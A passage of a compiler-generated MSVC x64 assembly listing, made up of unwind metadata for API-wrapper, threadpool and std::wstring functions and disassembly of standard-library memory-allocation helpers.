	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Create@threadpool@@YAHH_K@Z DD 025051701H
	DD	01122317H
	DD	0700b0021H
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Initialize@threadpool@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z DD 035052201H
	DD	011d3322H
	DD	070160023H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z DD 035052201H
	DD	011d3322H
	DD	070160023H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z DD 025052101H
	DD	011c2321H
	DD	070150021H
	DD	05014H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pVirtualAlloc@@YAPEAXPEAX_KKK@Z DD 025052201H
	DD	011d2322H
	DD	070160021H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pSleep@@YAXK@Z DD 025051201H
	DD	010d2312H
	DD	070060021H
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pExitThread@@YAXK@Z DD 025051201H
	DD	010d2312H
	DD	070060021H
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z DD 035052201H
	DD	011d3322H
	DD	070160023H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD 025051301H
	DD	010e2313H
	DD	070070029H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	040H
	DB	0f6H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD 025054719H
	DD	0118231dH
	DD	070110025H
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	0118H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DB	04dH
	DB	061H
	DB	073H
	DB	06bH
	DB	065H
	DB	064H
	DB	00H
	ORG $+8
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcVarDesc DD 028H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DD	08H
	DQ	FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcName$0
	ORG $+48
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcFrameData DD 01H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DD	00H
	DQ	FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	036H
	DB	0c9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD 025053d19H
	DD	010e2313H
	DD	070070031H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0178H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DB	041H
	DB	06cH
	DB	06cH
	DB	06fH
	DB	063H
	DB	05fH
	DB	06dH
	DB	061H
	DB	078H
	DB	00H
	ORG $+5
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcVarDesc DD 028H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DD	08H
	DQ	FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcName$0
	ORG $+48
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcFrameData DD 01H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DD	00H
	DQ	FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	070110029H
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c0025H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD 025051301H
	DD	010e2313H
	DD	070070025H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c0025H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001fH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$allocator@_W@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlen_string@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Orphan_all@_Container_base0@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c002dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Throw_bad_array_new_length@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	070030023H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_array_new_length@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_alloc@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@AEAA@QEBD@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gexception@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?what@exception@std@@UEBAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	07007001fH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1exception@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@QEBDH@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max@?$numeric_limits@_J@std@@SA_JXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??2@YAPEAX_KPEAX@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$RtlSecureZeroMemory DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
; Function compile flags: /Odt
;	COMDAT __JustMyCode_Default
_TEXT	SEGMENT
__JustMyCode_Default PROC				; COMDAT
  00000	c2 00 00	 ret	 0
__JustMyCode_Default ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Block_size$ = 8
_Ptr_container$ = 40
_Ptr$ = 72
_Bytes$ = 320
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z PROC ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>, COMDAT

; 140  : __declspec(allocator) void* _Allocate_manually_vector_aligned(const size_t _Bytes) {

$LN12:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 141  :     // allocate _Bytes manually aligned to at least _Big_allocation_alignment
; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  0001f	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  00026	48 83 c0 27	 add	 rax, 39			; 00000027H
  0002a	48 89 45 08	 mov	 QWORD PTR _Block_size$[rbp], rax

; 143  :     if (_Block_size <= _Bytes) {

  0002e	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  00035	48 39 45 08	 cmp	 QWORD PTR _Block_size$[rbp], rax
  00039	77 05		 ja	 SHORT $LN8@Allocate_m

; 144  :         _Throw_bad_array_new_length(); // add overflow

  0003b	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN8@Allocate_m:

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));

  00040	48 8b 4d 08	 mov	 rcx, QWORD PTR _Block_size$[rbp]
  00044	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
  00049	48 89 45 28	 mov	 QWORD PTR _Ptr_container$[rbp], rax
$LN4@Allocate_m:

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0004d	48 83 7d 28 00	 cmp	 QWORD PTR _Ptr_container$[rbp], 0
  00052	74 02		 je	 SHORT $LN9@Allocate_m
  00054	eb 0b		 jmp	 SHORT $LN10@Allocate_m
$LN9@Allocate_m:
$LN7@Allocate_m:
  00056	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0005b	33 c0		 xor	 eax, eax
  0005d	85 c0		 test	 eax, eax
  0005f	75 f5		 jne	 SHORT $LN7@Allocate_m
$LN10@Allocate_m:
  00061	33 c0		 xor	 eax, eax
  00063	85 c0		 test	 eax, eax
  00065	75 e6		 jne	 SHORT $LN4@Allocate_m

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00067	48 8b 45 28	 mov	 rax, QWORD PTR _Ptr_container$[rbp]
  0006b	48 83 c0 27	 add	 rax, 39			; 00000027H
  0006f	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H
  00073	48 89 45 48	 mov	 QWORD PTR _Ptr$[rbp], rax

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00077	b8 08 00 00 00	 mov	 eax, 8
  0007c	48 6b c0 ff	 imul	 rax, rax, -1
  00080	48 8b 4d 48	 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00084	48 8b 55 28	 mov	 rdx, QWORD PTR _Ptr_container$[rbp]
  00088	48 89 14 01	 mov	 QWORD PTR [rcx+rax], rdx

; 151  : 
; 152  : #ifdef _DEBUG
; 153  :     static_cast<uintptr_t*>(_Ptr)[-2] = _Big_allocation_sentinel;
; 154  : #endif // defined(_DEBUG)
; 155  :     return _Ptr;

  0008c	48 8b 45 48	 mov	 rax, QWORD PTR _Ptr$[rbp]
$LN11@Allocate_m:

; 156  : }

  00090	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  00097	5f		 pop	 rdi
  00098	5d		 pop	 rbp
  00099	c3		 ret	 0
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ENDP ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Get_size_of_n@$01@std@@YA_K_K@Z
_TEXT	SEGMENT
_Overflow_is_possible$ = 4
_Max_possible$1 = 40
_Count$ = 288
??$_Get_size_of_n@$01@std@@YA_K_K@Z PROC		; std::_Get_size_of_n<2>, COMDAT

; 68   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 69   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;

  0001f	c6 45 04 01	 mov	 BYTE PTR _Overflow_is_possible$[rbp], 1

; 70   : 
; 71   :     if constexpr (_Overflow_is_possible) {
; 72   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;

  00023	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0002d	48 89 45 28	 mov	 QWORD PTR _Max_possible$1[rbp], rax

; 73   :         if (_Count > _Max_possible) {

  00031	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0003b	48 39 85 20 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  00042	76 05		 jbe	 SHORT $LN2@Get_size_o

; 74   :             _Throw_bad_array_new_length(); // multiply overflow

  00044	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN2@Get_size_o:

; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  00049	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00050	48 d1 e0	 shl	 rax, 1
$LN3@Get_size_o:

; 79   : }

  00053	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0005a	5f		 pop	 rdi
  0005b	5d		 pop	 rbp
  0005c	c3		 ret	 0
??$_Get_size_of_n@$01@std@@YA_K_K@Z ENDP		; std::_Get_size_of_n<2>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 224
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z PROC ; std::_Allocate<16,std::_Default_allocate_traits,0>, COMDAT

; 234  : __declspec(allocator) _CONSTEXPR20 void* _Allocate(const size_t _Bytes) {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 235  :     // allocate _Bytes when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 236  : #if defined(_M_IX86) || defined(_M_X64)
; 237  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 238  :     if (!_STD is_constant_evaluated())
; 239  : #endif // _HAS_CXX20
; 240  :     {
; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0001f	48 81 bd e0 00
	00 00 00 10 00
	00		 cmp	 QWORD PTR _Bytes$[rbp], 4096 ; 00001000H
  0002a	72 0e		 jb	 SHORT $LN2@Allocate

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  0002c	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00033	e8 00 00 00 00	 call	 ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
  00038	eb 1a		 jmp	 SHORT $LN1@Allocate
$LN2@Allocate:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  0003a	48 83 bd e0 00
	00 00 00	 cmp	 QWORD PTR _Bytes$[rbp], 0
  00042	74 0e		 je	 SHORT $LN3@Allocate

; 248  :         return _Traits::_Allocate(_Bytes);

  00044	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  0004b	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
  00050	eb 02		 jmp	 SHORT $LN1@Allocate
$LN3@Allocate:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  00052	33 c0		 xor	 eax, eax
$LN1@Allocate:

; 252  : }

  00054	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ENDP ; std::_Allocate<16,std::_Default_allocate_traits,0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
_TEXT	SEGMENT
_Al$ = 224
_Count$ = 232
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z PROC ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >, COMDAT

; 2202 :     _Alloc& _Al, _CRT_GUARDOVERFLOW typename allocator_traits<_Alloc>::size_type& _Count) {

$LN3:
